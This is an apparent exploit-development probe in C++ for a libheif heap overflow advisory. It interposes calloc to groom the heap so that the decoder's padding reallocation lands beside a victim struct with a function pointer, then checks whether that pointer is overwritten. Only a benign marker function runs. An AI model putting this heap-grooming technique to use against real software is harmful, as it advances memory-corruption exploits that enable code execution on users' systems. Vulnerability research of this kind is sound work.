// Bounded adjacency probe for GHSA-hpg4-g2gc-pq42, W171.
//
// W169 groomed A+B before frame 1 was decoded; decoder allocations consumed A
// and the replacement plane never reused it. Here the grooming happens inside
// an interposed calloc at the exact 32783-byte allocation count observed for
// the padding reallocation, with no intervening allocations between free(A)
// and the real calloc. This tests only live-object adjacency and byte placement;
// no marker execution is attempted unless the pointer is provably unchanged.
#define _GNU_SOURCE
#include <cstdio>
#include <cstdint>
#include <string>
#include <cstdlib>
#include <libheif/heif.h>
#include <libheif/heif_sequences.h>

extern "C" void* __libc_malloc(size_t);
extern "C" void* __libc_calloc(size_t, size_t);
extern "C" void __libc_free(void*);

struct Victim {
  void (*fn)();
  unsigned char tag[32775];
};

static int g_count = 0;
static void* g_A = nullptr;
static Victim* g_B = nullptr;
static void benign_marker() { std::printf("BENIGN_MARKER_CALLED\n"); }

static void make_pair()
{
  // Allocate both from the fresh top chunk at program start so they are
  // contiguous; the interposer frees A only at the pad reallocation.
  g_A = __libc_malloc(32783);
  g_B = static_cast<Victim*>(__libc_malloc(sizeof(Victim)));
  for (size_t i = 0; i < sizeof(g_B->tag); ++i)
    g_B->tag[i] = static_cast<unsigned char>(0xa5 + (i & 0xff));
  g_B->fn = benign_marker;
}

 extern "C" void* calloc(size_t n, size_t s)
 {
   const size_t want = n * s;
   if (want == 32783) {
     ++g_count;
    if (g_count == 2 && g_A && g_B) {
      void* A = g_A;
      Victim* B = g_B;
      __libc_free(A);
       std::fprintf(stderr,
                    "GROOM count=%d A=%p B=%p delta=%ld fn=%p tag0=0x%02x\n",
                    g_count, A, static_cast<void*>(B),
                    static_cast<long>(static_cast<char*>(static_cast<void*>(B)) -
                                      static_cast<char*>(A)),
                    reinterpret_cast<void*>(B->fn), B->tag[0]);
       std::fflush(stderr);
     }
   }
  void* p = __libc_calloc(n, s);
  if (want == 32783)
    std::fprintf(stderr, "CALLOC32783 count=%d ret=%p%s\n", g_count, p,
                 p == g_A ? " == A" : "");
  return p;
}

static void report(const char* what, heif_error err)
{
  if (err.code)
    std::fprintf(stderr, "%s: rc=%d sub=%d %s\n", what, err.code, err.subcode,
                 err.message ? err.message : "(no message)");
}

int main(int argc, char** argv)
{
  if (argc < 3) {
    std::fprintf(stderr, "usage: %s INPUT.heif OUTPUT.heif\n", argv[0]);
    return 64;
  }
  const bool retain_frame1 = argc > 3 && std::string(argv[3]) == "retain";
  make_pair();
  heif_context* in = heif_context_alloc();
  report("read", heif_context_read_from_file(in, argv[1], nullptr));
  if (!heif_context_has_sequence(in)) return 1;
  heif_track* in_track = heif_context_get_track(in, 0);
  uint16_t tw = 0, th = 0;
  report("track resolution", heif_track_get_image_resolution(in_track, &tw, &th));

  heif_context* out = heif_context_alloc();
  heif_track* out_track = nullptr;
  heif_encoder* encoder = nullptr;
  report("get x265 encoder", heif_context_get_encoder_for_format(out, heif_compression_HEVC, &encoder));
  if (!encoder) return 2;
  report("add track", heif_context_add_visual_sequence_track(out, tw, th,
                                                             heif_track_type_image_sequence,
                                                             nullptr, nullptr, &out_track));
  if (!out_track) return 3;

  for (int frame = 0;; ++frame) {
    heif_image* img = nullptr;
    heif_error err = heif_track_decode_next_image(in_track, &img,
                                                  heif_colorspace_YCbCr,
                                                  heif_chroma_420, nullptr);
    if (err.code == heif_error_End_of_sequence) break;
    if (err.code) { report("decode", err); return 4; }
    int stride = 0;
    const uint8_t* plane = heif_image_get_plane_readonly(img, heif_channel_Y, &stride);
    std::printf("frame %d decoded: %dx%d stride=%d plane=%p%s\n", frame,
                heif_image_get_width(img, heif_channel_Y),
                heif_image_get_height(img, heif_channel_Y), stride,
                static_cast<const void*>(plane), plane == g_A ? " == A" : "");
    std::fflush(stdout);
    const heif_error enc_err = heif_track_encode_sequence_image(out_track, img, encoder, nullptr);
    report("encode", enc_err);
    std::printf("frame %d encoded rc=%d\n", frame, enc_err.code);
    std::fflush(stdout);
    if (frame == 1 && g_B) {
      std::printf("VICTIM fn=%p tag[0..7]=", reinterpret_cast<void*>(g_B->fn));
      for (int i = 0; i < 8; ++i) std::printf("%02x ", g_B->tag[i]);
      std::printf("\n");
      std::printf("HEADER A-8=");
      const unsigned long* hdr = reinterpret_cast<const unsigned long*>(
          static_cast<const unsigned char*>(g_A) - 8);
      std::printf("%#lx B-8=%#lx\n", hdr[0],
                  reinterpret_cast<const unsigned long*>(
                      static_cast<const unsigned char*>(static_cast<void*>(g_B)) - 8)[0]);
      std::fflush(stdout);
    }
    if (!(retain_frame1 && frame == 1))
      heif_image_release(img);
  }
  if (g_B) {
    std::printf("POST fn=%p\n", reinterpret_cast<void*>(g_B->fn));
    if (g_B->fn == benign_marker) g_B->fn();
  }
  report("end sequence", heif_track_encode_end_of_sequence(out_track, encoder));
  report("write", heif_context_write_to_file(out, argv[2]));
  heif_encoder_release(encoder);
  heif_track_release(out_track);
  heif_context_free(out);
  heif_track_release(in_track);
  heif_context_free(in);
  return 0;
}
